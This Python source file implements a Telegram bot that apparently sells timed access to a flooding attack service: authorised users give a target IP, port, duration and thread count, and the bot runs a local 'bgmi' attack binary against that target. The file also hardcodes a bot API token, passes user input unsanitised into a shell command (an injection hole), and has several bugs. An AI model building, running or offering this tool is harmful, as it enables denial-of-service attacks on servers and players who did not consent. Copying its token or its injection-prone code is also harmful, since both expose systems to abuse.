import asyncio
import json
import logging
import time
import signal
from aiogram import Bot, Dispatcher
from aiogram.types import Message, ChatMemberUpdated
from aiogram import filters
import datetime
import os
import sys

logging.basicConfig(level=logging.INFO)

API_TOKEN = '7272071866:AAFvmg6tgSqASef9fDOHMaqPRS6Pbo2hnbk'

AUTHORIZED_USERS = {}
AUTHORIZED_GROUPS = {}

def load_authorized_users():
    global AUTHORIZED_USERS
    try:
        with open("authorized_users.json", "r") as f:
            users = json.load(f)
            for user_id, user_data in users.items():
                if isinstance(user_data, dict) and "authorized_until" in user_data:
                    AUTHORIZED_USERS[int(user_id)] = {"authorized_until": datetime.datetime.fromtimestamp(user_data["authorized_until"])}
                else:
                    print(f"Warning: User {user_id} has no 'authorized_until' field in authorized_users.json")
    except FileNotFoundError:
        pass

def save_authorized_users():
    with open("authorized_users.json", "w") as f:
        users = {str(user_id): {"authorized_until": user_data["authorized_until"].timestamp()} for user_id, user_data in AUTHORIZED_USERS.items()}
        json.dump(users, f)

load_authorized_users()

def load_authorized_groups():
    global AUTHORIZED_GROUPS
    try:
        with open("authorized_groups.json", "r") as f:
            groups = json.load(f)
            for group_id, group_data in groups.items():
                if isinstance(group_data, dict) and "authorized_until" in group_data:
                    AUTHORIZED_GROUPS[int(group_id)] = {"authorized_until": datetime.datetime.fromtimestamp(group_data["authorized_until"])}
                else:
                    print(f"Warning: Group {group_id} has no 'authorized_until' field in authorized_groups.json")
    except FileNotFoundError:
        pass

def save_authorized_groups():
    with open("authorized_groups.json", "w") as f:
        groups = {str(group_id): {"authorized_until": group_data["authorized_until"].timestamp()} for group_id, group_data in AUTHORIZED_GROUPS.items()}
        json.dump(groups, f)

load_authorized_groups()

ADMIN_ID = 6157051269

async def check_authorization(user_id, chat_id=None):
    if user_id in AUTHORIZED_USERS:
        user_data = AUTHORIZED_USERS[user_id]
        if user_data["authorized_until"] < datetime.datetime.now():
            del AUTHORIZED_USERS[user_id]
            save_authorized_users()
            return False
        return True
    elif chat_id is not None and chat_id in AUTHORIZED_GROUPS:
        group_data = AUTHORIZED_GROUPS[chat_id]
        if group_data["authorized_until"] < datetime.datetime.now():
            del AUTHORIZED_GROUPS[chat_id]
            save_authorized_groups()
            return False
        return True
    else:
        return False

async def add_user(message: Message):
    if message.from_user.id!= ADMIN_ID:
        await message.answer("𝗢𝗻𝗹𝘆 𝗔𝗱𝗺𝗶𝗻 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 💀")
        return
    args = message.text.split()[1:]
    if len(args)!= 2:
        await message.answer("Usage: /adduser <user_id> <authorization_period>")
        return
    user_id = int(args[0])
    authorization_period = int(args[1])
    AUTHORIZED_USERS[user_id] = {"authorized_until": datetime.datetime.now() + datetime.timedelta(minutes=authorization_period)}
    save_authorized_users()
    await message.answer(f"User {user_id} added with authorization period of {authorization_period} minutes.")

async def remove_user(message: Message):
    if message.from_user.id!= ADMIN_ID:
        await message.answer("𝗢𝗻𝗹𝘆 𝗔𝗱𝗺𝗶𝗻 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻ඩ 💀")
        return
    args = message.text.split()[1:]
    if len(args)!= 1:
        await message.answer("Usage: /removeuser <user_id>")
        return
    user_id = int(args[0])
    if user_id in AUTHORIZED_USERS:
        del AUTHORIZED_USERS[user_id]
        save_authorized_users()
        await message.answer(f"User {user_id} removed.")
    else:
        await message.answer(f"User {user_id} not found.")

async def update_user(message: Message):
    if message.from_user.id!= ADMIN_ID:
        await message.answer("𝗢𝗻𝗹𝘆 𝗔𝗱𝗺𝗶𝗻 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻ඩ 💀")
        return
    args = message.text.split()[1:]
    if len(args)!= 2:
        await message.answer("Usage: /updateuser <user_id> <new_authorization_period>")
        return
    user_id = int(args[0])
    new_authorization_period = int(args[1])
    if user_id in AUTHORIZED_USERS:
        AUTHORIZED_USERS[user_id]["authorized_until"] = datetime.datetime.now() + datetime.timedelta(minutes=new_authorization_period)
        save_authorized_users()
        await message.answer(f"User {user_id} updated with new authorization period of {new_authorization_period} minutes.")
    else:
        await message.answer(f"User {user_id} not found.")

async def list_users(message: Message):
    if message.from_user.id!= ADMIN_ID:
        await message.answer("𝗢𝗻𝗹𝘆 𝗔𝗱𝗺𝗶𝗻 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻ඩ 💀")
        return
    user_list = []
    for user_id, user_data in AUTHORIZED_USERS.items():
        user_list.append(f"{user_id} - Authorized until: {user_data['authorized_until']}")
    await message.answer("Authorized users:\n" + "\n".join(user_list))

async def broadcast(message: Message):
    if message.from_user.id!= ADMIN_ID:
        await message.answer("𝗢𝗻𝗹𝘆 𝗔𝗱𝗺𝗶𝗻 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻ඩ 💀")
        return
    text = message.text.split(maxsplit=1)[1]
    for user_id in AUTHORIZED_USERS:
        try:
            await bot.send_message(user_id, text)
        except Exception as e:
            logging.error(f"Error sending message to user {user_id}: {e}")

def save_authorized_users():
    with open("authorized_users.json", "w") as f:
        users = {str(user_id): {"authorized_until": user_data["authorized_until"].timestamp()} for user_id, user_data in AUTHORIZED_USERS.items()}
        json.dump(users, f)

async def restart_bot(message: Message):
    if message.from_user.id!= ADMIN_ID:
        await message.answer("𝗢𝗻𝗹𝘆 𝗔𝗱𝗺𝗶𝗻 𝗖𝗮𝗻 𝗥𝘂𝗻 𝗧𝗵𝗶𝘀 𝗖𝗼𝗺𝗺𝗮𝗻ඩ 💀")
        return
    await message.answer("Restarting bot...")
    save_authorized_users()
    os.execl(sys.executable, sys.executable, *sys.argv)

async def user_info(message: Message):
    user_id = message.from_user.id
    user_data = AUTHORIZED_USERS.get(user_id)
    if user_data:
        approval_expiry = user_data["authorized_until"]
        if approval_expiry > datetime.datetime.now():
            approval_expiry_str = approval_expiry.strftime("%Y-%m-%d %H:%M:%S")
        else:
            approval_expiry_str = "Not approved"
    else:
        approval_expiry_str = "𝙊pps 𝙉ot 𝙖pproved 𝘾ontасt @TRUSTED_ROSHAN"
    username = message.from_user.username
    await message.answer(f"🔖 𝙍olе: 𝙐ser\n"
                         f"🆔 𝙐ser 𝙄D: {user_id}\n"
                         f"👤 𝙐sername: {username}\n"
                         f"⏳ 𝘼pproval 𝙤r 𝙀хpiгу: {approval_expiry_str}")
    
attack_process = None
last_attack_time = 0
async def welcome_user(message: Message):
    if not await check_authorization(message.from_user.id):
        await message.answer("Aссeѕѕ dеnіеd\n Yоu аrе nоt аutɦоrіzеd tо uѕе thіѕ bоt\n kіndlу Dm @TRUSTED_ROSHAN Tо Gеt Aссeѕѕ")
        return

    await message.answer(f"Wеlсоmе tо BGMΙ Aτtaсk Bоt! 🚀\n\n"

                         f"Thіѕ bоt аllоwѕ уоu tо launсh а BGMΙ аtταсk оn а taгgеt IP аnd ροrτ.\n\n" 

                         f"bgmі <іρ> <ροrτ> <tіmе_sесоnds> <tɦrеаds>  \n\n"    

                           "Ехаmρlе:/bgmі 20.235.94.237 17870 180 180\n\n") 

LAST_ATTACK_TIME = {}

async def bgmi_attack(message: Message):
    if not await check_authorization(message.from_user.id, message.chat.id):
        await message.answer("Aссeѕѕ dеnіеd\n Yоu аrе nоt аutɦоrіzеd tо uѕе thіѕ bоt\n kіndlу Dm @TRUSTED_ROSHAN Tо Gеt Aссeѕѕ")
        return

    current_time = time.time()

    if message.from_user.id in LAST_ATTACK_TIME and current_time - LAST_ATTACK_TIME[message.from_user.id] < 181:
        remaining_seconds = 300 - (current_time - LAST_ATTACK_TIME[message.from_user.id])
        minutes, seconds = divmod(remaining_seconds, 60)
        time_str = f"{int(minutes)} 𝙢inutеs 𝙖nd {int(seconds)} "
        await message.answer(f"Yоu 𝙢ust 𝙬ait {time_str}. 𝙨есоnds 𝙗еfоrе 𝙨tаrting 𝙖nother 𝙖tταсk")
        return

    args = message.text.split()[1:]
    if len(args) < 4:
        await message.answer(" 🤦‍♂️Uѕаgе: /bgmі <іρ> <ροrτ> <tіmе_sесоnds> <tɦrеаds> \n\n 🤷‍♀️Ехamρlе  /bgmі 20.235.94.237 17870 180 180")
        return

    ip, port, time_seconds, threads = args
    command = f"./bgmi {ip} {port} {time_seconds} {threads}"

    LAST_ATTACK_TIME[message.from_user.id] = current_time

    await message.answer(f"🚀Aτtaсk ѕtаrτεd оn🔫  \n  🎯IΡ: {ip}\n 🏖️Роrτ: {port}\n ⌚Τimе: {time_seconds} ѕес.")
    
    try:
        attack_process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        stdout, stderr = await attack_process.communicate()

        response = f"🚀Aτtaсk оn ☄️ {ip}:{port} \n 🎉Соmρlеtеd 🎊Sυссеssfullу🥳"
        if stdout:
            response += f"\nOutput:\n{stdout.decode()}"
        if stderr:
            response += f"\nErrors:\n{stderr.decode()}"

        await message.answer(response)

    except Exception as e:
        await message.answer(f"Error: {e}")

async def bgmi_stop(message: Message):
    if not await check_authorization(message.from_user.id):
        await message.answer("Aссeѕѕ dеnіеd\n Yоu аrе nоt аutɦоrіzеd tо uѕе thіѕ bоt\n kіndlу Dm @TRUSTED_ROSHAN Tо Gеt Aссeѕѕ")
        return
    if message.from_user.id not in AUTHORIZED_USERS:
        await message.answer("Aссeѕѕ dеnіеd\n Yоu аrе nоt аutɦоrіzеd tо uѕе thіѕ bоt\n kіndlу Dm @TRUSTED_ROSHAN Tо Gеt Aссeѕѕ‌.")
        return
    # Rest of the bgmi stop code
    global attack_process
    if attack_process is not None:
        attack_process.terminate()
        attack_process.wait()
        attack_process = None
        await message.answer("🚀Aτtaсk ѕtорреd.")
    else:
        await message.answer("Nо аtταсk іѕ сurrеntlу runnіng.")

async def add_group(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("Only admin can run this command 💀")
        return
    args = message.text.split()[1:]
    if len(args) != 2:
        await message.answer("Usage: /addgroup <group_id> <authorization_period>")
        return
    group_id = int(args[0])
    authorization_period = int(args[1])
    AUTHORIZED_GROUPS[group_id] = {
        "authorized_until": datetime.datetime.now() + datetime.timedelta(minutes=authorization_period)
    }
    save_authorized_groups()
    await message.answer(
        f"Group {group_id} added with authorization period of {authorization_period} minutes."
    )

async def remove_group(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("Only admin can run this command 💀")
        return
    args = message.text.split()[1:]
    if len(args) != 1:
        await message.answer("Usage: /removegroup <group_id>")
        return
    group_id = int(args[0])
    if group_id in AUTHORIZED_GROUPS:
        del AUTHORIZED_GROUPS[group_id]
        save_authorized_groups()
        await message.answer(f"Group {group_id} removed.")
    else:
        await message.answer(f"Group {group_id} not found.")

async def update_group(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("Only admin can run this command 💀")
        return
    args = message.text.split()[1:]
    if len(args) != 2:
        await message.answer("Usage: /updategroup <group_id> <new_authorization_period>")
        return
    group_id = int(args[0])
    new_authorization_period = int(args[1])
    if group_id in AUTHORIZED_GROUPS:
        AUTHORIZED_GROUPS[group_id][
            "authorized_until"
        ] = datetime.datetime.now() + datetime.timedelta(minutes=new_authorization_period)
        save_authorized_groups()
        await message.answer(
            f"Group {group_id} updated with new authorization period of {new_authorization_period} minutes."
        )
    else:
        await message.answer(f"Group {group_id} not found.")

async def list_groups(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("Only admin can run this command 💀")
        return
    group_list = []
    for group_id, group_data in AUTHORIZED_GROUPS.items():
        group_list.append(f"{group_id} - Authorized until: {group_data['authorized_until']}")
    await message.answer("Authorized groups:\n" + "\n".join(group_list))


async def main():
    bot = Bot(token=API_TOKEN)
    dp = Dispatcher()

    # Register handlers
    dp.message.register(welcome_user, filters.Command("start"))
    dp.message.register(bgmi_attack, filters.Command(commands=['bgmi']))
    dp.message.register(broadcast, filters.Command("broadcast"))
    dp.message.register(bgmi_stop, filters.Command("stop"))
    dp.message.register(add_user, filters.Command("adduser"))
    dp.message.register(remove_user, filters.Command("removeuser"))
    dp.message.register(update_user, filters.Command("updateuser"))
    dp.message.register(list_users, filters.Command("listuser"))
    dp.message.register(restart_bot, filters.Command("restart"))
    dp.message.register(user_info, filters.Command("userinfo"))
    dp.message.register(add_group, filters.Command("addgroup"))
    dp.message.register(remove_group, filters.Command("removegroup"))
    dp.message.register(update_group, filters.Command("updategroup"))
    dp.message.register(list_groups, filters.Command("listgroup"))

    async def remove_expired_users():
        while True:
            global AUTHORIZED_USERS
            for user_id in list(AUTHORIZED_USERS.keys()):
                user_data = AUTHORIZED_USERS[user_id]
                if user_data["authorized_until"] < datetime.datetime.now():
                    del AUTHORIZED_USERS[user_id]
                    save_authorized_users()
            await asyncio.sleep(60)

    async def remove_expired_groups():
        while True:
            global AUTHORIZED_GROUPS
            for group_id in list(AUTHORIZED_GROUPS.keys()):
                group_data = AUTHORIZED_GROUPS[group_id]
                if group_data["authorized_until"] < datetime.datetime.now():
                    del AUTHORIZED_GROUPS[group_id]
                    save_authorized_groups()
            await asyncio.sleep(60)

    asyncio.create_task(remove_expired_users())
    asyncio.create_task(remove_expired_groups())

    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())